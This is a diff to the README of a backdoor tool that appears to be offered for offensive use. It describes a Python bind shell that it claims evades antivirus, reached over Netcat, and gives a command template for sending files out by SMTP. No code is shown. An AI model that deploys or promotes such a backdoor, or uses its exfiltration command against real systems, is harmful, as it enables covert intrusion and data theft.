@@ -1,7 +1,7 @@
 # MayorSec Backdoor
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M03Q2JN)
 ### Fully functioning bind-type backdoor
-![Gatekeeper](/images/backdoorlite.png)
+![MayorSecBackdoorLite](/images/backdoorlite.png)
 
 This backdoor is a fully functioning bind shell and lite version of my full functioning Gatekeeper tool. It can be ran with Python or compiled to an exe and has full functioning command line access with Windows and Linux.  When compiled it bypasses all Antivirus solutions on Antiscan.me.
 
@@ -17,7 +17,7 @@ Once connected you can utilize commands as normal.  If you wish to use Powershel
 This will execute the command.  Note that some Powershell functionality may crash the Netcat session requiring a reconnect.  
 
 ## SMTP Exfiltration
-
+![SMTPExfil](/images/smtpexfil.png)
 ```exfiltrate filename <sender_email> <sender_email_password> <receiver_email>```
 
 ## Compilation
